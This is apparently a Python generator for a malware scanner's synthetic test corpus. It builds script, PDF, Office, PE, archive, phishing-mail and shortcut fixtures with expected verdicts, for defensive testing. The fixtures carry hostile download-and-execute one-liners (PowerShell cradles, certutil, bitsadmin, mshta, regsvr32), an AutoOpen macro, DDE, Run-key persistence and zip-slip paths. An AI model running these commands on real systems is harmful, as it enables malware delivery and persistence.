"""Expanded, manifest-driven corpus (target: 500+ fixtures, 40+ types).

The old corpora prove individual rules. This generator adds breadth: many
formats, many attack patterns, benign counterexamples and malformed edge
cases. Every fixture carries an expectation (``green``, ``flag`` or ``any``);
``tests/test_corpus_v2.py`` scans the whole set and fails on an unexpected
verdict.

The data is synthetic and deterministic where the format allows it. Real
malware is never written into the repository; the VM workflow remains the
only place for live samples.
"""

from __future__ import annotations

import io
import json
import random
import struct
import zipfile
import zlib
from dataclasses import dataclass
from pathlib import Path

import corpus_determinism as det
import make_test_corpus_extended as ext
from ole_writer import make_vba_doc

ROOT = Path(__file__).resolve().parents[1]


@dataclass(frozen=True)
class Fixture:
    name: str
    data: bytes
    family: str
    expected: str  # green | flag | any
    kind: str  # benign | malicious | edge


def _rng(seed: int) -> random.Random:
    return random.Random(seed)


def _pdf(body: str, *, trailer: str = "") -> bytes:
    return (
        b"%PDF-1.7\n"
        b"1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
        b"2 0 obj << /Type /Pages /Kids [] /Count 0 >> endobj\n"
        + body.encode("latin-1", "replace")
        + b"\n"
        + trailer.encode("latin-1", "replace")
        + b"\ntrailer << /Root 1 0 R >>\n%%EOF\n"
    )


def _ooxml(
    *,
    document: str,
    rels: str = "",
    extra: dict[str, bytes] | None = None,
    macro: bytes | None = None,
) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        det.zip_write(
            zf,
            "[Content_Types].xml",
            (
                b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                b'<Default Extension="xml" ContentType="application/xml"/>'
                b'<Override PartName="/word/document.xml" '
                b'ContentType="application/vnd.openxmlformats-officedocument.'
                b'wordprocessingml.document.main+xml"/></Types>'
            ),
        )
        det.zip_write(
            zf,
            "_rels/.rels",
            (
                b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                b'<Relationship Id="rId1" '
                b'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
                b'relationships/officeDocument" Target="word/document.xml"/>'
                b"</Relationships>"
            ),
        )
        det.zip_write(
            zf,
            "word/document.xml",
            (
                '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>'
                + document
                + "</w:t></w:r></w:p></w:body></w:document>"
            ).encode("utf-8"),
        )
        if rels:
            det.zip_write(zf, "word/_rels/document.xml.rels", rels.encode("utf-8"))
        if macro is not None:
            det.zip_write(zf, "word/vbaProject.bin", macro)
        for name, value in (extra or {}).items():
            det.zip_write(zf, name, value)
    return buf.getvalue()


def _lnk(args: str) -> bytes:
    cls_id = b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
    flags = (1 << 5) | (1 << 7)
    header = b"\x4c\x00\x00\x00" + cls_id + struct.pack("<I", flags)
    header += b"\x00" * (76 - len(header))
    return header + struct.pack("<H", len(args)) + args.encode("utf-16-le")


def _eml_bytes(
    *,
    sender: str,
    display: str = "",
    subject: str,
    body: str,
    auth: str = "",
    reply_to: str = "",
    return_path: str = "",
    link: str = "",
    attachment: tuple[str, bytes] | None = None,
    received: bool = True,
) -> bytes:
    import email.message
    import email.policy
    import email.utils

    msg = email.message.EmailMessage(policy=email.policy.default)
    address = email.utils.formataddr((display, sender)) if display else sender
    msg["From"] = address
    msg["To"] = "opfer@example.invalid"
    msg["Subject"] = subject
    msg["Date"] = "Tue, 1 Jan 2030 10:00:00 +0000"
    msg["Message-ID"] = "<fixture-v2@example.invalid>"
    if received:
        msg["Received"] = (
            "from mx.example (mx.example [203.0.113.9]) by postfach.opfer.de "
            "with ESMTPS; Tue, 1 Jan 2030 10:00:00 +0000"
        )
    msg["Authentication-Results"] = auth or "mx.example; spf=pass; dkim=pass; dmarc=pass"
    if reply_to:
        msg["Reply-To"] = reply_to
    if return_path:
        msg["Return-Path"] = return_path
    text = body
    if link:
        text += f"\nLink: {link}\n"
    msg.set_content(text)
    if attachment is not None:
        name, payload = attachment
        msg.add_attachment(
            payload,
            maintype="application",
            subtype="octet-stream",
            filename=name,
        )
    det.pin_mime_boundary(msg)
    return msg.as_bytes()


def _script_comment(extension: str) -> str:
    """Comment marker that is actually valid in the fixture language."""
    if extension == ".vbs":
        return "'"
    if extension == ".js":
        return "//"
    if extension in (".bat", ".cmd"):
        return "REM"
    return "#"  # PowerShell, shell


def _build_scripts() -> list[Fixture]:
    out: list[Fixture] = []
    payloads = [
        ("ps_encoded", "powershell -NoP -EncodedCommand SQBFAFgA"),
        ("ps_cradle", "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')"),
        ("certutil", "certutil -urlcache -f http://198.51.100.8/p.exe p.exe"),
        ("mshta", "mshta http://198.51.100.9/a.hta"),
        ("regsvr32", "regsvr32 /s /u /i:http://198.51.100.10/a.sct scrobj.dll"),
        ("bitsadmin", "bitsadmin /transfer j http://198.51.100.11/a.exe C:\\a.exe"),
        ("wmic", 'wmic process call create "powershell -nop -w hidden -enc SQBFAFgA"'),
        (
            "run_key",
            (
                "powershell -nop -w hidden -enc SQBFAFgA\n"
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
                "/v x /d C:\\a.exe"
            ),
        ),
    ]
    extensions = [".ps1", ".bat", ".cmd", ".vbs", ".js", ".wsf", ".hta", ".sh"]
    for index, (label, payload) in enumerate(payloads):
        for extension in extensions[:5]:
            out.append(
                Fixture(
                    f"script_{label}_{index}_{extension.lstrip('.')}{extension}",
                    (
                        f"{_script_comment(extension)} {label} {extension} "
                        f"{index}\n{payload}\n"
                    ).encode(),
                    "scripts",
                    "flag",
                    "malicious",
                )
            )
    # 30 benign scripts.
    for index, extension in enumerate([*extensions, ".py", ".php", ".txt", ".md"]):
        for variant in range(4 if index < 7 else 1):
            out.append(
                Fixture(
                    f"benign_script_{index}_{variant}{extension}",
                    (f"echo 'hello {index}/{variant}'\nprint('normal document text')\nGet-Date\n").encode(),
                    "scripts",
                    "green",
                    "benign",
                )
            )
    return out[:70]


def _build_pdfs() -> list[Fixture]:
    out: list[Fixture] = []
    bodies = [
        ("js", "<< /S /JavaScript /JS (app.alert(1)) >>"),
        ("launch", "<< /S /Launch /F (cmd.exe) >>"),
        ("openaction", "<< /OpenAction 3 0 R >>"),
        ("embedded", "<< /Type /Filespec /F (a.exe) /EF << /F (a.exe) >> >>"),
        ("aa", "<< /AA << /O << /S /JavaScript /JS (x) >> >> >>"),
        ("uri", "<< /S /URI /URI (http://198.51.100.12/a) >>"),
        ("obfuscated", "<< /J#61vaScript /JS (x) >>"),
        ("richmedia", "<< /Subtype /RichMedia /RichMediaSettings << >> >>"),
        ("objstm", "<< /Type /ObjStm /N 1 /First 10 /Filter /FlateDecode >>"),
        ("action", "<< /S /SubmitForm /F (http://198.51.100.13/) >>"),
    ]
    for name, body in bodies:
        for index in range(3):
            out.append(
                Fixture(
                    f"pdf_{name}_{index}.pdf",
                    _pdf(body + f" % variant {index}"),
                    "pdf",
                    "flag",
                    "malicious",
                )
            )
    # A few with appended payloads.
    for index in range(5):
        out.append(
            Fixture(
                f"pdf_appended_{index}.pdf",
                _pdf("<< /Type /Catalog >>") + f"\n% appended {index}\n".encode() + (b"MZ" + b"\x90" * 64),
                "pdf",
                "flag",
                "malicious",
            )
        )
    import pikepdf

    for index in range(20):
        pdf = pikepdf.new()
        for _page in range(index % 4 + 1):
            pdf.pages.append(
                pikepdf.Page(
                    pikepdf.Dictionary(
                        Type=pikepdf.Name.Page,
                        MediaBox=[0, 0, 612 + index, 792],
                    )
                )
            )
        buf = io.BytesIO()
        pdf.save(buf, deterministic_id=True)
        out.append(Fixture(f"benign_pdf_{index}.pdf", buf.getvalue(), "pdf", "green", "benign"))
    return out[:55]


def _build_office() -> list[Fixture]:
    out: list[Fixture] = []
    external = (
        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        'Target="http://198.51.100.20/template.dotm" TargetMode="External"/></Relationships>'
    )
    dde = 'DDEAUTO c:\\windows\\system32\\cmd.exe "/c calc.exe"'
    for index in range(10):
        out.append(
            Fixture(
                f"ooxml_external_{index}.docx",
                _ooxml(document=f"view {index}", rels=external),
                "office",
                "flag",
                "malicious",
            )
        )
    for index in range(10):
        out.append(
            Fixture(
                f"ooxml_dde_{index}.docx",
                _ooxml(document=f"{dde} {index}", rels=external),
                "office",
                "flag",
                "malicious",
            )
        )
    for index in range(5):
        out.append(
            Fixture(
                f"ooxml_macro_{index}.docm",
                _ooxml(document=f"macro {index}", macro=ext.doc_vba_macro()),
                "office",
                "flag",
                "malicious",
            )
        )
    for index in range(10):
        source = (
            "Sub AutoOpen()\r\n"
            f'  Shell "powershell -nop -w hidden -enc SQBFAFgA {index}"\r\n'
            '  URLDownloadToFile 0, "http://198.51.100.21/a.exe", "a.exe", 0, 0\r\n'
            "End Sub\r\n"
        )
        out.append(
            Fixture(
                f"legacy_vba_{index}.doc",
                make_vba_doc(source, f"Module{index}"),
                "office",
                "flag",
                "malicious",
            )
        )
    for index in range(15):
        if index % 2 == 0:
            out.append(
                Fixture(
                    f"benign_office_{index}.docx",
                    _ooxml(document=f"normal report {index}"),
                    "office",
                    "green",
                    "benign",
                )
            )
        else:
            from openpyxl import Workbook

            wb = Workbook()
            ws = wb.active
            ws["A1"] = f"price list {index}"
            ws["A2"] = index * 10
            out.append(
                Fixture(
                    f"benign_office_{index}.xlsx",
                    det.save_workbook_deterministic(wb),
                    "office",
                    "green",
                    "benign",
                )
            )
    return out[:50]


def _build_pe() -> list[Fixture]:
    out: list[Fixture] = []
    packers = [b"UPX0", b".aspack", b"UPX1", b"UPX0", b".aspack"]
    imports = [
        (("URLDownloadToFileA", "WinExec"), "urlmon.dll"),
        (("WinExec", "CreateProcessA"), "kernel32.dll"),
        (("CreateProcessA", "VirtualAllocEx"), "kernel32.dll"),
        (("VirtualAllocEx", "WriteProcessMemory"), "kernel32.dll"),
        (("RegSetValueExA", "CreateProcessA"), "advapi32.dll"),
        (("ShellExecuteA", "URLDownloadToFileA"), "shell32.dll"),
    ]
    for index, name in enumerate(packers):
        for variant in range(2):
            out.append(
                Fixture(
                    f"pe_packer_{index}_{variant}.exe",
                    ext._import_pe(
                        (ext._NEUTRAL_IMPORT,), section_name=name, extra_overlay=bytes([variant]) * 8
                    ),
                    "pe",
                    "flag",
                    "malicious",
                )
            )
    for index, (import_name, dll) in enumerate(imports):
        for variant in range(3):
            out.append(
                Fixture(
                    f"pe_import_{index}_{variant}.exe",
                    ext._import_pe(
                        import_name, dll=dll, section_name=b"UPX0", extra_overlay=bytes([variant]) * 8
                    ),
                    "pe",
                    "flag",
                    "malicious",
                )
            )
    for index in range(5):
        out.append(
            Fixture(
                f"pe_weak_{index}.exe",
                ext._import_pe(
                    (ext._NEUTRAL_IMPORT,),
                    dll_chars=0,
                    section_name=b"UPX0",
                    extra_overlay=bytes([index]) * 8,
                ),
                "pe",
                "flag",
                "malicious",
            )
        )
    for index in range(5):
        out.append(
            Fixture(
                f"pe_overlay_{index}.exe",
                ext._import_pe(
                    (ext._NEUTRAL_IMPORT,), extra_overlay=bytes([index]) * 8 + ext._entropy_blob(1024)
                ),
                "pe",
                "flag",
                "malicious",
            )
        )
    for index in range(15):
        out.append(
            Fixture(
                f"benign_pe_{index}.exe",
                ext._import_pe(
                    ("GetProcAddress", "LoadLibraryA"),
                    section_name=b".text",
                    extra_overlay=bytes([index]) * 8,
                ),
                "pe",
                "green",
                "benign",
            )
        )
    return out[:45]


def _build_images() -> list[Fixture]:
    out: list[Fixture] = []
    png = ext._png_logo()
    jpeg = ext._jpeg_photo()
    for index in range(5):
        out.append(
            Fixture(
                f"png_trailer_{index}.png",
                png + bytes([index]) * 8 + ext._import_pe((ext._NEUTRAL_IMPORT,)),
                "images",
                "flag",
                "malicious",
            )
        )
    for index in range(5):
        out.append(
            Fixture(
                f"jpeg_trailer_{index}.jpg",
                jpeg + bytes([index]) * 8 + ext._import_pe((ext._NEUTRAL_IMPORT,)),
                "images",
                "flag",
                "malicious",
            )
        )
    for index in range(5):
        out.append(
            Fixture(
                f"svg_script_{index}.svg",
                (
                    f"<svg xmlns='http://www.w3.org/2000/svg'><script>alert({index}); "
                    "powershell -enc SQBFAFgA</script></svg>"
                ).encode(),
                "images",
                "flag",
                "malicious",
            )
        )
    for index in range(5):
        # HEIC is a real, compressed image format: its high entropy is
        # explained by the format. Keep it as benign type coverage instead of
        # pretending the format alone is malicious.
        out.append(
            Fixture(
                f"heic_{index}.heic",
                ext.heic_photo((b"heic", b"heix", b"heim", b"heis", b"mif1")[index]),
                "images",
                "green",
                "benign",
            )
        )
    # AP8: new media types. The benign entries carry HIGH-entropy payloads on
    # purpose: WebP/MP3/MP4 are compressed by specification and must stay
    # GREEN (GEN_ENTROPY weight 0). TIFF/ICO are NOT on that list — the same
    # high entropy must stay a scoring finding there, which is exactly what
    # the two *_noise fixtures prove.
    def box(typ: bytes, payload: bytes) -> bytes:
        return struct.pack(">I", 8 + len(payload)) + typ + payload

    noise = _rng(41).randbytes(4096)
    out.append(
        Fixture(
            "benign_webp.webp",
            b"RIFF" + struct.pack("<I", 8 + len(noise)) + b"WEBP" + b"VP8 "
            + noise,
            "images",
            "green",
            "benign",
        )
    )
    out.append(
        Fixture(
            "benign_mp3.mp3",
            b"ID3\x03\x00\x00\x00\x00\x00\x0a" + noise,
            "images",
            "green",
            "benign",
        )
    )
    out.append(
        Fixture(
            "benign_mp4.mp4",
            box(b"ftyp", b"isom" + struct.pack(">I", 0) + b"mp42")
            + box(b"mdat", noise),
            "images",
            "green",
            "benign",
        )
    )
    out.append(
        Fixture(
            "benign_tiff.tiff",
            b"II*\x00" + struct.pack("<I", 8) + struct.pack("<H", 0) + b"\x00" * 64,
            "images",
            "green",
            "benign",
        )
    )
    ifd_noise = _rng(42).randbytes(4096)
    out.append(
        Fixture(
            "tiff_noise.tiff",
            b"II*\x00" + struct.pack("<I", 8) + struct.pack("<H", 0) + ifd_noise,
            "images",
            "flag",
            "malicious",
        )
    )
    ico_noise = _rng(43).randbytes(4096)
    out.append(
        Fixture(
            "ico_noise.ico",
            b"\x00\x00\x01\x00"
            + struct.pack("<H", 1)
            + struct.pack("<BBBBHHII", 16, 16, 0, 0, 1, 32, len(ico_noise), 22)
            + ico_noise,
            "images",
            "flag",
            "malicious",
        )
    )
    for index in range(5):
        out.append(
            Fixture(
                f"gif_comment_{index}.gif",
                b"GIF89a"
                + bytes([index]) * 32
                + b"http://198.51.100.30/a"
                + ext._import_pe((ext._NEUTRAL_IMPORT,)),
                "images",
                "flag",
                "malicious",
            )
        )
    from PIL import Image

    for index in range(30):
        if index % 6 == 0:
            buf = io.BytesIO()
            Image.new(
                "RGB",
                (8 + index % 5, 8 + index % 3),
                (index * 17 % 256, index * 31 % 256, index * 47 % 256),
            ).save(buf, format="PNG")
            data, suffix = buf.getvalue(), "png"
        elif index % 6 == 1:
            buf = io.BytesIO()
            Image.new(
                "RGB",
                (8 + index % 5, 8 + index % 3),
                (index * 19 % 256, index * 23 % 256, index * 29 % 256),
            ).save(buf, format="JPEG", quality=85)
            data, suffix = buf.getvalue(), "jpg"
        elif index % 6 == 2:
            data, suffix = (
                b"GIF89a" + struct.pack("<HH", 1 + index, 1 + index) + b"\x00" * 20,
                "gif",
            )
        elif index % 6 == 3:
            data, suffix = (
                b"BM"
                + struct.pack("<I", 54 + index)
                + struct.pack("<I", 0)
                + struct.pack("<I", 54)
                + struct.pack("<IiiHHIIiiII", 40, 1 + index, 1, 1, 24, 0, 4, 0, 0, 0, 0)
                + bytes([index]) * 4,
                "bmp",
            )
        elif index % 6 == 4:
            # A valid ICONDIR: one 16-byte directory entry that fits the file,
            # followed by a tiny pixel block. The old fixture declared 5..29
            # images in 65 bytes and was therefore (correctly) rejected as
            # malformed — the benign ICO type had no snapshot coverage.
            pixel = bytes([index & 0xFF]) * 64
            data, suffix = (
                b"\x00\x00\x01\x00"
                + struct.pack("<H", 1)
                + struct.pack(
                    "<BBBBHHII", 16, 16, 0, 0, 1, 32, len(pixel), 6 + 16
                )
                + pixel,
                "ico",
            )
        else:
            data, suffix = (
                b"RIFF" + struct.pack("<I", 4 + index) + b"WEBPVP8 " + bytes([index]),
                "webp",
            )
        out.append(Fixture(f"benign_image_{index}.{suffix}", data, "images", "green", "benign"))
    return out[:61]


def _build_archives() -> list[Fixture]:
    out: list[Fixture] = []

    def zipped(name: str, members: dict[str, bytes]) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for member, payload in members.items():
                det.zip_write(zf, member, payload)
        return buf.getvalue()

    names = ["../evil.exe", "/abs/evil.exe", "..\\evil.exe", "a/../../evil.exe", "normal/../../evil.exe"]
    for index, name in enumerate(names):
        for variant in range(2):
            out.append(
                Fixture(
                    f"zip_slip_{index}_{variant}.zip",
                    zipped("x.zip", {name: b"MZ" + b"\x90" * 32}),
                    "archives",
                    "flag",
                    "malicious",
                )
            )
    for index in range(5):
        out.append(
            Fixture(
                f"zip_bomb_{index}.zip",
                zipped("bomb.zip", {f"big{index}.bin": bytes([index]) * (5 * 1024 * 1024)}),
                "archives",
                "flag",
                "malicious",
            )
        )
    for index in range(5):
        out.append(
            Fixture(f"zip_encrypted_{index}.zip", ext.zip_encrypted_aes(), "archives", "flag", "malicious")
        )
    for index in range(5):
        inner = zipped(
            "inner.zip",
            {"../evil.txt": b"MZ" + b"\x90" * 32 + bytes([index])},
        )
        out.append(
            Fixture(
                f"zip_nested_{index}.zip",
                zipped("outer.zip", {"inner.zip": inner}),
                "archives",
                "flag",
                "malicious",
            )
        )
    for index in range(5):
        out.append(
            Fixture(
                f"zip_exe_{index}.zip",
                zipped(
                    "x.zip",
                    {
                        f"setup{index}.exe": ext._import_pe((ext._NEUTRAL_IMPORT,)),
                        "rechnung.pdf": _pdf("<< /S /JavaScript /JS (app.alert(1)) >>"),
                    },
                ),
                "archives",
                "flag",
                "malicious",
            )
        )
    for index in range(5):
        members = {f"f{i}.txt": f"x{index}".encode() for i in range(120)}
        members["../evil.txt"] = b"MZ" + b"\x90" * 16
        out.append(
            Fixture(f"zip_many_{index}.zip", zipped("many.zip", members), "archives", "flag", "malicious")
        )
    for index in range(5):
        out.append(
            Fixture(
                f"tar_payload_{index}.tar",
                ext.tar_with_traversal() + b"\x00" * index,
                "archives",
                "any",
                "malicious",
            )
        )
    for index in range(5):
        out.append(
            Fixture(f"rar_{index}.rar", ext.rar_archive() + bytes([index]), "archives", "flag", "malicious")
        )
    for index in range(5):
        out.append(
            Fixture(f"iso_{index}.iso", ext.iso_image() + bytes([index]), "archives", "any", "malicious")
        )
    for index in range(15):
        out.append(
            Fixture(
                f"benign_zip_{index}.zip",
                zipped("ok.zip", {f"readme{index}.txt": f"hello {index}".encode()}),
                "archives",
                "green",
                "benign",
            )
        )
    return out[:55]


def _build_mail() -> list[Fixture]:
    out: list[Fixture] = []
    auth_fail = "mx.example; spf=fail; dkim=fail; dmarc=fail"
    patterns = [
        ("spf", dict(sender="a@evil.example", subject="Rechnung", body="Bitte zahlen", auth=auth_fail)),
        (
            "display",
            dict(
                sender="b@evil.example",
                display="Sparkasse",
                subject="Konto",
                body="Pruefen Sie",
                auth=auth_fail,
            ),
        ),
        (
            "reply",
            dict(
                sender="c@evil.example",
                subject="Antwort",
                body="Hallo",
                auth=auth_fail,
                reply_to="d@other.example",
            ),
        ),
        (
            "return",
            dict(
                sender="e@evil.example",
                subject="Mahnung",
                body="Zahlung",
                auth=auth_fail,
                return_path="f@other.example",
            ),
        ),
        (
            "shortlink",
            dict(
                sender="g@evil.example",
                subject="Paket",
                body="Sendung",
                link="http://bit.ly/abc123",
                auth=auth_fail,
            ),
        ),
        (
            "iplink",
            dict(
                sender="h@evil.example",
                subject="Login",
                body="Konto",
                link="http://198.51.100.40/login",
                auth=auth_fail,
            ),
        ),
        (
            "attach",
            dict(
                sender="i@evil.example",
                subject="Dokument",
                body="Anbei",
                auth=auth_fail,
                attachment=("rechnung.pdf.exe", b"MZ" + b"\x90" * 32),
            ),
        ),
        (
            "html",
            dict(
                sender="j@evil.example",
                display="Sparkasse",
                subject="News",
                body="<div style='display:none'>x</div>",
                auth=auth_fail,
                link="http://bit.ly/abc123",
                attachment=("rechnung.pdf.exe", b"MZ" + b"\x90" * 32),
            ),
        ),
    ]
    for label, kwargs in patterns:
        for index in range(5):
            varied = dict(kwargs)
            varied["subject"] = f"{kwargs.get('subject', 'Mail')} {index}"
            varied["body"] = f"{kwargs.get('body', 'Text')} {index}"
            out.append(
                Fixture(f"mail_{label}_{index}.eml", _eml_bytes(**varied), "mail", "flag", "malicious")
            )
    for index in range(15):
        out.append(
            Fixture(
                f"benign_mail_{index}.eml",
                _eml_bytes(
                    sender="kunde@example.invalid",
                    subject=f"Hallo {index}",
                    body=(
                        f"Guten Tag, dies ist Nachricht Nummer {index} mit ausreichend "
                        "lesbarem Text fuer den Test. Der Inhalt enthaelt keine "
                        "Links, keine Anhaenge und keine verdaechtigen Befehle. "
                        "Viele Gruesse und einen schoenen Tag."
                    ),
                ),
                "mail",
                "green",
                "benign",
            )
        )
    return out[:55]


def _build_lnk_rtf_swf() -> list[Fixture]:
    out: list[Fixture] = []
    args = [
        "/c powershell -nop -w hidden -EncodedCommand SQBFAFgA",
        "/c certutil -urlcache -f http://198.51.100.50/a.exe a.exe",
        "/c mshta http://198.51.100.51/a.hta",
        "cmd.exe /c bitsadmin /transfer j http://198.51.100.52/a.exe C:\\a.exe",
        "powershell IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.53/a')",
    ]
    for index, arg in enumerate(args):
        for variant in range(2):
            out.append(
                Fixture(
                    f"lnk_{index}_{variant}.lnk",
                    _lnk(f"cmd.exe /c {arg} {index}{variant}"),
                    "lnk",
                    "flag",
                    "malicious",
                )
            )
    for index in range(5):
        out.append(
            Fixture(
                f"rtf_ole_{index}.rtf",
                ext.rtf_with_embedded_ole() + b"\n" + str(index).encode(),
                "rtf",
                "flag",
                "malicious",
            )
        )
    for index in range(5):
        payload = (
            b"FWS\x09"
            + b"\x00" * 10
            + f"powershell -nop -w hidden -enc SQBFAFgA http://198.51.100.60/{index}".encode()
        )
        out.append(
            Fixture(
                f"swf_{index}.swf",
                b"CWS\x09" + b"\x00" * 4 + zlib.compress(payload),
                "swf",
                "flag",
                "malicious",
            )
        )
    return out[:20]


def _build_shortcuts() -> list[Fixture]:
    """Windows Internet shortcuts (.url): benign intranet vs dangerous targets.

    The type is content-based (``[InternetShortcut]`` + ``URL=``), not
    extension-based; the suspicious variants cover every target class the
    shortcut parser names: local file, UNC, javascript:, IP literal and
    credentials.
    """
    out: list[Fixture] = [
        Fixture(
            "url_benign.url",
            (
                b"[InternetShortcut]\r\n"
                b"URL=https://intranet.example.local/wiki\r\n"
                b"IconFile=%SystemRoot%\\system32\\shell32.dll\r\n"
                b"IconIndex=13\r\n"
            ),
            "shortcuts",
            "green",
            "benign",
        )
    ]
    variants = {
        "file": b"file:///C:/Windows/System32/calc.exe",
        "unc": b"\\\\fileserver\\share\\setup.exe",
        "javascript": b"javascript:alert(document.domain)",
        "ip": b"http://203.0.113.10/payload",
        "credentials": b"https://user:pass@example.com/login",
    }
    for name, target in variants.items():
        out.append(
            Fixture(
                f"url_{name}.url",
                b"[InternetShortcut]\r\nURL=" + target + b"\r\n",
                "shortcuts",
                "flag",
                "malicious",
            )
        )
    return out


def _build_edges() -> list[Fixture]:
    out: list[Fixture] = [
        Fixture("edge_empty.bin", b"", "edge", "any", "edge"),
        Fixture("edge_one_byte.bin", b"\x00", "edge", "any", "edge"),
        Fixture("edge_truncated_pe.exe", b"MZ" + b"\x00" * 10, "edge", "any", "edge"),
        Fixture("edge_truncated_pdf.pdf", b"%PDF-1.7\n1 0 obj", "edge", "any", "edge"),
        Fixture("edge_truncated_zip.zip", b"PK\x03\x04" + b"\x00" * 10, "edge", "any", "edge"),
        Fixture("edge_high_entropy.bin", _rng(1).randbytes(64 * 1024), "edge", "any", "edge"),
        Fixture("edge_nulls.bin", b"\x00" * (1024 * 1024), "edge", "any", "edge"),
        Fixture("edge_long_name_" + "a" * 120 + ".bin", b"x", "edge", "any", "edge"),
        Fixture("edge_unicode_äöü_日本語.txt", b"hello", "edge", "any", "edge"),
        Fixture("edge_bidi_\u202eevil.txt", b"hello", "edge", "any", "edge"),
        Fixture("edge_double_extension.pdf.exe", b"MZ" + b"\x90" * 32, "edge", "any", "edge"),
        Fixture("edge_motw.txt", b"[ZoneTransfer]\r\nZoneId=3\r\n", "edge", "any", "edge"),
        Fixture("edge_lnk_empty.lnk", b"\x4c\x00\x00\x00", "edge", "any", "edge"),
        Fixture("edge_swf_empty.swf", b"CWS\x09" + b"\x00" * 8, "edge", "any", "edge"),
        Fixture("edge_rtf_empty.rtf", b"{\\rtf1}", "edge", "any", "edge"),
        Fixture("edge_eml_empty.eml", b"From: a@b\r\n\r\n", "edge", "any", "edge"),
        Fixture("edge_json.json", b'{"a": 1}', "edge", "any", "edge"),
        Fixture("edge_xml.xml", b"<root/>", "edge", "any", "edge"),
        Fixture("edge_svg.svg", b"<svg/>", "edge", "any", "edge"),
        Fixture("edge_iso.iso", ext.iso_image(), "edge", "any", "edge"),
    ]
    for index in range(17):
        out.append(
            Fixture(
                f"edge_random_{index}.bin",
                _rng(100 + index).randbytes(4096 + index * 37),
                "edge",
                "any",
                "edge",
            )
        )
    return out


def _build_nested_containers() -> list[Fixture]:
    """AP5: ZIP-in-ZIP (Lücke) und der harmlose PE-Gegenfall.

    Zwei Archivebenen: ohne die neue Regel wäre das äußere Archiv GRÜN, mit
    ihr GELB/20. Eine einzige Verpackungsebene ist bewusst kein Befund (der
    Harmlos-Korpus enthält genau diese Form als ``bundle.zip``). Der Gegenfall
    ist ein PE mit eingebettetem ZIP — die normale Form eines
    Go-/Electron-Installers; die Regel darf ihn nicht treffen (die
    Generic-Pipeline führt eingebettete Archive in PE mit Gewicht 0).
    """

    def zipped(members: dict[str, bytes]) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for member, payload in members.items():
                det.zip_write(zf, member, payload)
        return buf.getvalue()

    payload = zipped({"note.txt": b"nur ein harmloser Hinweis\n"})
    inner = zipped({"payload.zip": payload})
    outer = zipped({"inner.zip": inner, "readme.txt": b"Paket\n"})
    installer = ext._import_pe(
        (ext._NEUTRAL_IMPORT,), section_name=b".text", extra_overlay=inner
    )
    return [
        Fixture("nested_archive.zip", outer, "archives", "flag", "malicious"),
        Fixture("nested_electron_installer.exe", installer, "pe", "green", "benign"),
    ]


def build_fixtures() -> list[Fixture]:
    fixtures: list[Fixture] = []
    for builder in (
        _build_scripts,
        _build_pdfs,
        _build_office,
        _build_pe,
        _build_images,
        _build_archives,
        _build_mail,
        _build_lnk_rtf_swf,
        _build_shortcuts,
        _build_edges,
        _build_nested_containers,
    ):
        fixtures.extend(builder())
    # Unique names are part of the contract: a duplicate would silently
    # overwrite a fixture and make the count lie.
    seen: set[str] = set()
    for fixture in fixtures:
        if fixture.name in seen:
            raise ValueError(f"duplicate fixture name: {fixture.name}")
        seen.add(fixture.name)
    return fixtures


def write_corpus(target: Path) -> list[Path]:
    target.mkdir(parents=True, exist_ok=True)
    paths: list[Path] = []
    for fixture in build_fixtures():
        path = target / fixture.name
        path.write_bytes(fixture.data)
        paths.append(path)
    return paths


def write_manifest(target: Path) -> Path:
    fixtures = build_fixtures()
    manifest = {
        "version": 1,
        "count": len(fixtures),
        "families": sorted({fixture.family for fixture in fixtures}),
        "kinds": {
            kind: sum(1 for fixture in fixtures if fixture.kind == kind)
            for kind in ("benign", "malicious", "edge")
        },
        "fixtures": [
            {
                "name": fixture.name,
                "family": fixture.family,
                "kind": fixture.kind,
                "expected": fixture.expected,
                "size": len(fixture.data),
            }
            for fixture in fixtures
        ],
    }
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(json.dumps(manifest, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    return target


if __name__ == "__main__":
    out = write_corpus(Path("tests/data/corpus_v2"))
    manifest = write_manifest(Path("tests/data/corpus_v2_manifest.json"))
    print(f"{len(out)} fixtures, manifest {manifest}")
